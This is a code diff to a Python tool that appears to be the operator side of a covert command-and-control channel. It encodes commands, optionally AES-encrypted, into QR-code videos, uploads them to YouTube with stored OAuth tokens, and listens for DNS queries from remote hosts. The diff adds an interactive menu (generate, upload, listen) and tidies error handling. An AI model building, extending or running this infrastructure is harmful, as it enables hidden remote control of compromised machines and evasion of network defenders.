@@ -79,47 +79,51 @@ def listener(ns_subdomain, log_file):
 				counter += 1
 			pass
 
+		except KeyboardInterrupt:
+			server.close()
+			main_loop()
+
 		except Exception as e:
-			print("Exception")
+			print("Unknown exception: " + str(e))
 			break
 
 		server.close()
 
 
-def aes_encrypt(message, aes_key, iv):
+def aes_encrypt(message, aes_key, aes_iv):
 	message = message.encode()
 	BS = 16
 	pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
 	raw = pad(message)
 	#iv = 16 * b'0'
 	aes_key_bytes = str.encode(aes_key)
-	iv_bytes = str.encode(iv)
+	iv_bytes = str.encode(aes_iv)
 	cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv_bytes)
 	enc = cipher.encrypt(raw)
 	rebus_encoded = rebus.b64encode(base64.b64encode(enc).decode('utf-8'))
 	return rebus_encoded.decode("utf-8")
 
 
-def generate_frames(image_type, imagesFolder, command, aes_key, iv):
+def generate_frames(image_type, command, aes_key, aes_iv):
 	if image_type == "qr":
 		import pyqrcode
 		qrcode = pyqrcode.create(command,version=10)
-		qrcode.png(imagesFolder + "image_1.png",scale=8)
+		qrcode.png("image_1.png",scale=8)
 	elif image_type == "qr_aes":
 		import pyqrcode
-		encrypted_cmd = aes_encrypt(command,aes_key, iv)
+		encrypted_cmd = aes_encrypt(command,aes_key, aes_iv)
 		print("[+] AES-encrypted value: "+encrypted_cmd)
 		qrcode = pyqrcode.create(encrypted_cmd,version=10)
-		qrcode.png(imagesFolder + "image_1.png",scale=8)
+		qrcode.png("image_1.png",scale=8)
 	else:
 		print("Unknown type")
 	return 1
 
 
-def create_file(video_file, imagesFolder):
+def create_file(video_file):
 	img_array = []
 	natsort = lambda s: [int(t) if t.isdigit() else t.lower() for t in re.split(r'(\d+)', s)]
-	for filename in sorted(glob(imagesFolder + '*.png'), key=natsort):
+	for filename in sorted(glob('*.png'), key=natsort):
 		img = cv2.imread(filename)
 		height, width, layers = img.shape
 		size = (width,height)
@@ -134,13 +138,13 @@ def create_file(video_file, imagesFolder):
 	out.release()
 
 
-def generate_video(image_type, video_file, aes_key, iv, command, imagesFolder):
-	generate_frames(image_type, imagesFolder, command, aes_key, iv)
-	print("[+] Creating file in the path "+video_file)
-	create_file(video_file, imagesFolder)
+def generate_video(image_type, video_file, aes_key, aes_iv, command):
+	generate_frames(image_type, command, aes_key, aes_iv)
+	print("[+] Creating file in the path "+video_file+"\n")
+	create_file(video_file)
 	os.remove("image_1.png")
 
-
+'''
 def get_args():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-t', '--type', required=True, action='store', help='Type')
@@ -150,10 +154,10 @@ def get_args():
 	parser.add_argument('-i', '--aesiv', required=False, action='store', help='IV')
 	my_args = parser.parse_args()
 	return my_args
-
+'''
 
 def upload_video(video_name):
-	print("Uploading video...")
+	print("[+] Uploading video...")
 	uploader = YoutubeUploader(client_id, client_secret)
 	uploader.authenticate(access_token=access_token_, refresh_token=refresh_token_)
 	# Video options
@@ -168,9 +172,45 @@ def upload_video(video_name):
 	uploader.upload(video_name, options)
 	uploader.close()
 	os.remove(video_name)
+	print("[+] Video uploaded")
+
+
+def main_loop():
+	while True:
+		option = input("> ")
+		if option == "generate":
+			command_ = input("Command: ")
+			type_ = input("Type (\"qr\" or \"qr_aes\"): ")
+			aeskey = ""
+			aesiv = ""
+			if type_ == "qr_aes":
+				aeskey = input("AES key: ")
+				if(len(aeskey) % 16 != 0):
+	                                print("[+] AES key length must be multiple of 16.")
+	                                sys.exit(0)
+				aesiv = input("AES IV: ")
+				if(len(aesiv) % 16 != 0):
+	                                print("[+] IV length must be multiple of 16.")
+	                                sys.exit(0)
+			file_ = input("Video file name: ")
+			generate_video(type_, file_, aeskey, aesiv, command_)
+			#generate_video(args.type, args.file, args.aeskey, args.aesiv, args.command, "")
+			#upload_video(args.file)
+			#listener(ns_subdomain, log_file)
+		elif option == "upload":
+			file_ = input("Video file name: ")
+			upload_video(file_)
+		elif option == "listen":
+			listener(ns_subdomain, log_file)
+		elif option == "exit":
+			sys.exit(0)
+		else:
+			print("Options: \n - \"generate\": \tCreate a QR video \n - \"upload\": \tUpload a video to Youtube \n - \"listen\": \tListen for DNS queries \n - \"exit\": \tExit the program \n")
+
 
 
 def main():
+	'''
 	args = get_args()
 	if args.type=="qr_aes":
 		if args.aeskey is None or args.aesiv is None:
@@ -183,9 +223,8 @@ def main():
 			if(len(args.aesiv) % 16 != 0):
 				print("[+] IV length must be multiple of 16.")
 				sys.exit(0)
-	generate_video(args.type, args.file, args.aeskey, args.aesiv, args.command, "")
-	upload_video(args.file)
-	listener(ns_subdomain, log_file)
+	'''
+	main_loop()
 
 
 if __name__== "__main__":
